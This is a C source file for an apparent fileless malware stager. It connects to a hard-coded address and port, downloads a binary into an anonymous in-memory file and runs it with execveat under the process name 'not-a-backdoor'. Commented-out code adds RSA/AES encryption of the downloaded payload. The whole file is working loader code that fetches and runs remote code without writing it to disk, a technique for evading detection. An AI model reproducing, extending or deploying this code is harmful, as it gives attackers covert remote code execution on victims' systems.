#define _GNU_SOURCE

#include <diet/fcntl.h>
#include <diet/stdlib.h>
#include <diet/unistd.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
// #include <openssl/aes.h>
// #include <openssl/rsa.h>

#include "execveat.h"

// #define DEBUG

#define KEY_LENGTH  4096
#define PUB_EXP     65537
#ifdef DEBUG
    #include <diet/stdio.h>
    #define D(x) x
#else
    #define D(x)
#endif


// static int custom_memfd_create(void)
// {
//     return syscall(__NR_memfd_create, "", (unsigned int)(MFD_CLOEXEC));
// }


static int write_with_len(int s, uint8_t *buf, size_t buf_len)
{
    uint32_t buf_len_u = buf_len;
    ssize_t buf_with_len_len = sizeof(buf_len_u) + buf_len;
    uint8_t *buf_with_len = malloc(buf_with_len_len);
    memcpy(buf_with_len, &buf_len_u, sizeof(buf_len_u));
    memcpy(buf_with_len + sizeof(buf_len_u), buf, buf_len);

    ssize_t write_result = write(s, buf_with_len, buf_with_len_len); // TODO implement if write_result > 0 but less than len, but should be fine for now
    if (write_result != buf_with_len_len)
    {
        D(printf("[line %i] write() failed: %li != %lu\n", __LINE__, write_result, buf_with_len_len));
        return 1;
    }

    return 0;
}


static uint8_t* read_with_len(int s, ssize_t len)
{
    uint8_t *read_buf = malloc(len);
    ssize_t num_read = 0;
    while (num_read < len)
    {
        ssize_t read_result = read(s, read_buf + num_read, len - num_read);
        if (read_result <= 0)
        {
            break;
        }
        num_read = read_result + num_read;
    }

    if (num_read != len)
    {
        D(printf("[line %i] read() failed: %li != %lu\n", __LINE__, num_read, len));
        return NULL;
    }
    return read_buf;
}


static uint8_t* read_unknown_len(int s, ssize_t *num_read_on_success)
{
    uint32_t len = 0;
    ssize_t read_result = read(s, &len, sizeof(len));
    if (read_result != sizeof(len))
    {
        D(printf("read read_size failed\n"));
        return NULL;
    }

    D(printf("num_read: %u\n", len));
    uint8_t *ret = read_with_len(s, len);
    if (ret != NULL && num_read_on_success != NULL)
    {
        *num_read_on_success = len;
    }
    return ret;
}


/*
static int aes_cbc_decrypt(uint8_t *aes_key_buf, uint8_t *iv, uint8_t *buf, ssize_t buf_len)
{
    if (buf_len % 16 != 0)
    {
        D(printf("buf_len (%li) must be a multiple of block size\n", buf_len));
        return -1;
    }
    AES_KEY aes_key_expanded;
    AES_set_decrypt_key(aes_key_buf, 256, &aes_key_expanded);
    AES_cbc_encrypt(buf, buf, buf_len, &aes_key_expanded, iv, 0);
}
*/


static int download(int fd)
{
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct timeval timeout;
    timeout.tv_sec = 1000; // after CONNECT_TIMEOUT seconds connect() will timeout
    timeout.tv_usec = 0;
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    int syn_retries = 1;
    setsockopt(s, IPPROTO_TCP, TCP_SYNCNT, &syn_retries, sizeof(syn_retries));

    struct sockaddr_in server_addr = {
        .sin_addr.s_addr = inet_addr("127.0.0.1"),
        .sin_family = AF_INET,
        .sin_port = htons(1337),
    };

    int connect_result = connect(s, (struct sockaddr *)&server_addr, sizeof(server_addr));
    if (connect_result != 0)
    {
        D(printf("failed to connect\n"));
        close(s);
        return 1;
    }

    // TEMP_CODE
    ssize_t binary_buf_len = 0;
    uint8_t *binary_buf = read_unknown_len(s, &binary_buf_len);
    if (binary_buf == NULL)
    {
        D(printf("Error reading binary_buf\n"));
        close(s);
        return 1;
    }

    ssize_t write_result = write(fd, binary_buf, binary_buf_len);
    if (write_result != binary_buf_len)
    {
        D(printf("[line %i] write() failed: %li != %lu\n", __LINE__, write_result, binary_buf_len));
        return 1;
    }

    return 0;
    // END TEMP_CODE

    /*
    RSA *rsa_keys = RSA_generate_key(KEY_LENGTH, PUB_EXP, NULL, NULL);
    uint8_t *public_key_buf = NULL;
    int public_key_len = i2d_RSAPublicKey(rsa_keys, &public_key_buf);
    uint32_t public_key_len_u = (uint32_t)public_key_len;

    D(printf("public_key_len=%i\n", public_key_len));

    if (write_with_len(s, public_key_buf, public_key_len) != 0)
    {
        D(printf("write public_key_buf failed\n"));
        close(s);
        return 1;
    }

    uint8_t *aes_key_enc = read_unknown_len(s, NULL);
    if (aes_key_enc == NULL)
    {
        D(printf("read aes_key_enc failed\n"));
        close(s);
        return 1;
    }

    uint8_t *aes_key_buf = malloc(RSA_size(rsa_keys));
    if(RSA_private_decrypt(RSA_size(rsa_keys), aes_key_enc, aes_key_buf, rsa_keys, RSA_PKCS1_OAEP_PADDING) == -1)
    {
        D(printf("Error decrypting with RSA\n"));
        return 1;
    }

    uint8_t *iv_buf = read_with_len(s, 16);
    if (iv_buf == NULL)
    {
        D(printf("Error reading iv_buf\n"));
        close(s);
        return 1;
    }

    ssize_t binary_buf_len = 0;
    uint8_t *binary_buf = read_unknown_len(s, &binary_buf_len);
    if (binary_buf == NULL)
    {
        D(printf("Error reading binary_buf\n"));
        close(s);
        return 1;
    }

    aes_cbc_decrypt(aes_key_buf, iv_buf, binary_buf, binary_buf_len);

    uint8_t padding_len = binary_buf[binary_buf_len-1];
    binary_buf_len = binary_buf_len - padding_len;

    D(printf("Removed %u padding so binary_buf_len is %li\n", padding_len, binary_buf_len));

    ssize_t write_result = write(fd, binary_buf, binary_buf_len);
    if (write_result != binary_buf_len)
    {
        D(printf("[line %i] write() failed: %li != %lu\n", __LINE__, write_result, binary_buf_len));
        return 1;
    }

    D(printf("%s\n", binary_buf));
    */

    return 0;
}


int main()
{
    int mem_fd = memfd_create("", (unsigned int)(MFD_CLOEXEC));
    int download_result = download(mem_fd);

    if (download_result != 0)
    {
        D(puts("Download failed"));
        return 1;
    }

    const char *new_argv[] = {"not-a-backdoor", NULL};
    const char *new_env[] = { NULL };
    execveat(mem_fd, "", new_argv, new_env, AT_EMPTY_PATH);

    return 0;
}
